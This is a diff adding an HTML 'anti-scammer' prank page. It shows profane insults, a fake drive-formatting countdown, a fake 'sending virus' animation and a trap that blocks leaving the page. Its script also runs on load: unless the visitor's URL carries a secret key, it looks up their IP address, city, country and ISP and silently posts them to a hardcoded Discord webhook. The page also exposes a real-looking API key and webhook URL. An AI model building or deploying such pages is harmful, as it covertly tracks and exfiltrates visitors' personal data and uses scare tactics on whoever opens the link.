@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fuck You, Scammers</title>
+    <style>
+        body {
+            background-color: #111;
+            color: #fff;
+            font-family: "Courier New", Courier, monospace;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            font-size: 3.5rem;
+            color: crimson;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 1.5rem;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+        .scammer-gif {
+            margin: 20px auto;
+            width: 50%;
+            max-width: 400px;
+            border: 3px solid crimson;
+            border-radius: 10px;
+        }
+        .burn {
+            font-size: 2rem;
+            color: orange;
+            text-shadow: 0 0 10px crimson;
+            animation: glow 1s infinite;
+        }
+        @keyframes glow {
+            0% { text-shadow: 0 0 5px red; }
+            50% { text-shadow: 0 0 20px orange; }
+            100% { text-shadow: 0 0 5px red; }
+        }
+        a {
+            text-decoration: none;
+            color: lime;
+            font-size: 1.5rem;
+        }
+        a:hover {
+            text-shadow: 0 0 10px lime;
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+</head>
+<body>
+    <h1>Fuck You, Scammers</h1>
+    <p>Hey, you low-life, basement-dwelling piece of shit. Scamming people isn’t a career—it’s a cry for help.</p>
+    <p class="burn">Loading the perfect roast...</p>
+    <img class="scammer-gif" src="https://media.giphy.com/media/VbnUQpnihPSIgIXuZv/giphy.gif" alt="Scammers Be Burning">
+    <p id="countdown">Formatting your shitty drive in 10 seconds...</p>
+    <a href="https://www.google.com/search?q=how+to+stop+being+a+worthless+scammer" target="_blank">Click Here, Dumbass</a>
+
+    <audio id="warning-sound" autoplay>
+        <source src="https://www.soundjay.com/button/beep-10.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // 1. Random Insults
+        const insults = [
+            "You're the reason shampoo bottles have instructions.",
+            "Your brain is as useful as a screen door on a submarine.",
+            "You couldn't scam a paper bag, let alone a person.",
+            "You bring everyone down to your level and beat them with experience.",
+        ];
+        document.querySelector(".burn").textContent = insults[Math.floor(Math.random() * insults.length)];
+
+        // 2. Countdown Timer
+        let timeLeft = 10;
+        const timer = setInterval(() => {
+            document.getElementById("countdown").textContent = `Formatting your shitty drive in ${timeLeft} seconds...`;
+            timeLeft--;
+            if (timeLeft < 0) {
+                clearInterval(timer);
+                document.getElementById("countdown").textContent = "Just kidding, you dodged the bullet this time, dumbass.";
+            }
+        }, 1000);
+
+        // 3. Trap Them on the Page
+        window.onbeforeunload = function() {
+            return "Think you're leaving? Fucking try me.";
+        };
+
+        // 4. Easter Egg on Insult Click
+        document.querySelector(".burn").addEventListener("click", function() {
+            alert("Oh, so now you’re listening? Too little, too late, asshole.");
+        });
+
+        // 5. Fake Hack Animation
+        let hackedText = "HACKING IN PROGRESS... SENDING VIRUS...";
+        let i = 0;
+
+        function typeEffect() {
+            if (i < hackedText.length) {
+                document.body.innerHTML += hackedText.charAt(i);
+                i++;
+                setTimeout(typeEffect, 100);
+            }
+        }
+        // Trigger Fake Hack after 15s (optional)
+        setTimeout(typeEffect, 15000);
+
+        // 6. Redirect to Insult Page
+        setTimeout(() => {
+            window.location.href = "https://en.wikipedia.org/wiki/List_of_insults";
+        }, 30000);
+
+        // 7. Geolocation and IP Tracking (Discord Webhook)
+        const secretKey = new URLSearchParams(window.location.search).get("key");
+        const allowedKey = "friend"; // Replace with your own secret key
+
+        console.log("Secret key in URL: ", secretKey); // Debugging statement
+
+        if (secretKey === allowedKey) {
+            console.log("Access detected with the secret key. Not sending info to Discord.");
+        } else {
+            // Fetch geolocation data
+            $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=fa1a2f8df62745e3bb75c15b08f54592", function(data) {
+                console.log("Geolocation data received: ", data); // Debugging statement
+                
+                var request = new XMLHttpRequest();
+                request.open("POST", "https://discord.com/api/webhooks/1336309114669895720/X9pEtV19eA7_O9w-kXaq5yRbFziViRegwPFr3Tur8iyyiFuKo3PPbzHHkVuwOLnNIEOk");
+                request.setRequestHeader('Content-type', 'application/json');
+                
+                var payload = {
+                    username: "Elias Hacker Assistant.",
+                    avatar_url: "5ab7e5f886077698169a4537405cebba.jpg",
+                    embeds: [{
+                        color: "4700374",
+                        title: "YOU GOT INFO",
+                        fields: [
+                            {name: "IP", value: data.ip_address || "Unavailable"},
+                            {name: "CITY", value: data.city || "Unavailable"},
+                            {name: "COUNTRY", value: data.country || "Unavailable"},
+                            {name: "CONTINENT", value: data.continent || "Unavailable"},
+                            {name: "TIMEZONE", value: data.timezone || "Unavailable"},  // FIXED this line
+                            {name: "ISP", value: data.connection.isp || "Unavailable"}
+                        ],
+                        footer: {
+                            text: "By KazUpTV"
+                        }
+                    }]
+                };
+                
+                console.log("Payload to Discord: ", JSON.stringify(payload)); // Debugging statement
+                
+                request.send(JSON.stringify(payload));
+            }).fail(function() {
+                console.error("Failed to fetch geolocation data."); // Debugging statement
+            });
+        }
+    </script>
+</body>
+</html>
